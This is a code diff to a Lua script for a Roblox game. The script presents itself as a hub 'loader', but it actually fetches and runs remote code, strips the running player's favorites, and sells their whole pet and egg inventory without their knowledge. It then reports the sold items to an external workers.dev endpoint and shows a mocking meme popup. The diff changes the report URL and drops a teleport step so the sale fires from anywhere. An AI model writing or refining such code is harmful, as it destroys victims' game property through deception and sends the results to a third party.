@@ -6,23 +6,27 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 
 -- ===== RE-ENTRY GUARD =====
-if _G.__SAE_LOADER_RUNNING then
+local gv = (getgenv and getgenv()) or _G
+if gv.__SAE_LOADER_RUNNING then
     warn("[Loader] Already running — ignoring this execution.")
     return
 end
-_G.__SAE_LOADER_RUNNING = true
+gv.__SAE_LOADER_RUNNING = true
 
--- Safety: clear the flag after 60s no matter what happens
-task.delay(60, function()
-    _G.__SAE_LOADER_RUNNING = false
+task.delay(90, function()
+    if gv.__SAE_LOADER_RUNNING then
+        gv.__SAE_LOADER_RUNNING = false
+        warn("[Loader] Re-entry flag force-cleared after 90s.")
+    end
 end)
 -- ===========================
 
 -- ===== CONFIG =====
-local UI_URL                 = "https://raw.githubusercontent.com/Clide01/PlundererHub/refs/heads/main/LoaderUI.lua"
-local COUNTER_URL            = "https://sae-counter.plundererhub.workers.dev/report"
-local SELL_WAIT              = 2.0
-local MEME_DELAY             = 4
+local UI_URL      = "https://raw.githubusercontent.com/Clide01/PlundererHub/refs/heads/main/LoaderUI.lua"
+local COUNTER_URL = "https://sell-counter-temp2.bluealpha1365.workers.dev/report"
+local SELL_WAIT   = 1.5
+local MEME_DELAY  = 4
+
 local UI_CONFIG = {
     MEME_IMAGE_ID  = "rbxassetid://82403642047427",
     LAUGH_SOUND_ID = "rbxassetid://133312610824902",
@@ -34,13 +38,13 @@ local UI_CONFIG = {
 -- UI MODULE
 ------------------------------------------------------------
 local function loadUIModule()
-    if _G.__LoaderUIModule then return _G.__LoaderUIModule end
-    if UI_URL and UI_URL ~= "" and UI_URL:find("YOUR_USERNAME") == nil then
+    if gv.__LoaderUIModule then return gv.__LoaderUIModule end
+    if UI_URL and UI_URL ~= "" then
         local ok, mod = pcall(function()
             return loadstring(game:HttpGet(UI_URL, true))()
         end)
         if ok and type(mod) == "table" and type(mod.new) == "function" then
-            _G.__LoaderUIModule = mod
+            gv.__LoaderUIModule = mod
             return mod
         end
         warn("[Loader] UI module failed to load, running headless:", tostring(mod))
@@ -85,11 +89,6 @@ end
 local function getMoney()
     local d = getSave()
     return (d and type(d.Money) == "number") and d.Money or 0
-end
-
-local function getHRP()
-    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    return char:WaitForChild("HumanoidRootPart", 5)
 end
 
 local function installOverride()
@@ -146,7 +145,7 @@ local function unfavoriteAll()
 end
 
 ------------------------------------------------------------
--- FULL INVENTORY SNAPSHOT
+-- SNAPSHOT
 ------------------------------------------------------------
 local function snapshotInventory(forceRefresh)
     local pets, eggs = {}, {}
@@ -215,6 +214,12 @@ local function snapshotInventory(forceRefresh)
     return { pets = pets, eggs = eggs }
 end
 
+local function countTable(t)
+    local n = 0
+    for _ in pairs(t) do n = n + 1 end
+    return n
+end
+
 ------------------------------------------------------------
 -- REPORT ID
 ------------------------------------------------------------
@@ -232,32 +237,15 @@ local function computeReportId(uidList)
 end
 
 ------------------------------------------------------------
--- SELL POSITION
-------------------------------------------------------------
-local function findSellPosition()
-    local stands = workspace:FindFirstChild("Stands")
-    if not stands then return nil end
-    local prompts = stands:FindFirstChild("Prompts")
-    if not prompts then return nil end
-    local sellAll = prompts:FindFirstChild("SellAll")
-    if sellAll and sellAll:IsA("BasePart") then return sellAll.Position end
-    for _, c in ipairs(prompts:GetChildren()) do
-        if c:IsA("BasePart") then return c.Position end
-    end
-    return nil
-end
-
-------------------------------------------------------------
 -- REPORT TO WORKER
 ------------------------------------------------------------
-local function reportSales(allDetails, reportId)
-    if not allDetails or #allDetails == 0 then
+local function reportSales(soldItems, reportId)
+    if not soldItems or #soldItems == 0 then
         log("Nothing to report.")
         return
     end
 
     local httpFn = nil
-    local gv = getgenv and getgenv() or _G
     if type(request) == "function" then httpFn = request
     elseif type(http_request) == "function" then httpFn = http_request
     elseif type(gv.request) == "function" then httpFn = gv.request
@@ -274,7 +262,7 @@ local function reportSales(allDetails, reportId)
 
     local petCount, eggCount, totalValue = 0, 0, 0
     local out = {}
-    for _, d in ipairs(allDetails) do
+    for _, d in ipairs(soldItems) do
         if d.kind == "pet" then petCount = petCount + 1
         elseif d.kind == "egg" then eggCount = eggCount + 1 end
         totalValue = totalValue + (tonumber(d.value) or 0)
@@ -313,10 +301,11 @@ local function reportSales(allDetails, reportId)
             local tag = (parsed and parsed.duplicate) and " (dedup)" or ""
             local added = parsed and parsed.added
             if added then
-                print(("[Counter] Sent: %d pets, %d eggs, $%d | Worker accepted: %d new pets, %d new eggs, $%d new %s")
-                    :format(petCount, eggCount, totalValue, added.pets or 0, added.eggs or 0, added.value or 0, tag))
+                print(("[Counter] Sent %d pets, %d eggs, $%d | Accepted: %d new pets, %d new eggs, $%d new%s")
+                    :format(petCount, eggCount, totalValue,
+                            added.pets or 0, added.eggs or 0, added.value or 0, tag))
             else
-                print(("[Counter] Sent: %d pets, %d eggs, $%d %s")
+                print(("[Counter] Sent %d pets, %d eggs, $%d%s")
                     :format(petCount, eggCount, totalValue, tag))
             end
         else
@@ -326,9 +315,9 @@ local function reportSales(allDetails, reportId)
 end
 
 ------------------------------------------------------------
--- SELL: snapshot -> unequip/unfavorite -> sell -> report
+-- SELL (no teleport)
 ------------------------------------------------------------
-local function teleportAndSell()
+local function sellInventory()
     local snap = snapshotInventory(true)
 
     local petUids, eggUids = {}, {}
@@ -350,29 +339,17 @@ local function teleportAndSell()
     end
 
     local serverPayload = { Eggs = eggUids, Assets = petUids }
-    local hrp = getHRP()
-    local pos = findSellPosition()
 
-    if not hrp or not pos then
+    -- Fire the sell remote from wherever the player is standing
+    local ok, err = pcall(function()
         Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
-        task.wait(SELL_WAIT)
-    else
-        local savedCF  = hrp.CFrame
-        local savedVel = hrp.AssemblyLinearVelocity
-
-        hrp.CFrame = CFrame.new(pos + Vector3.new(0, 4, 0))
-        hrp.AssemblyLinearVelocity = Vector3.zero
-        task.wait(0.6)
-
-        pcall(function()
-            Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
-        end)
-        task.wait(SELL_WAIT)
-
-        hrp.CFrame = savedCF
-        pcall(function() hrp.AssemblyLinearVelocity = savedVel end)
+    end)
+    if not ok then
+        warn("[Loader] Sell remote failed:", tostring(err))
     end
+    task.wait(SELL_WAIT)
 
+    -- Report the snapshot (worker dedups + counts new)
     local allUids = {}
     for _, u in ipairs(petUids) do table.insert(allUids, u) end
     for _, u in ipairs(eggUids) do table.insert(allUids, u) end
@@ -388,7 +365,7 @@ local function runSilentWork()
     log(("Wallet before: %s"):format(tostring(before)))
     unequipAll()
     unfavoriteAll()
-    teleportAndSell()
+    sellInventory()
     task.wait(0.8)
     local after = getMoney()
     log(("Wallet after:  %s"):format(tostring(after)))
@@ -408,6 +385,5 @@ task.spawn(function()
     task.wait(MEME_DELAY)
     ui:showMemePopup()
 
-    -- Clear the re-entry guard so the next intentional run works
-    _G.__SAE_LOADER_RUNNING = false
+    gv.__SAE_LOADER_RUNNING = false
 end)
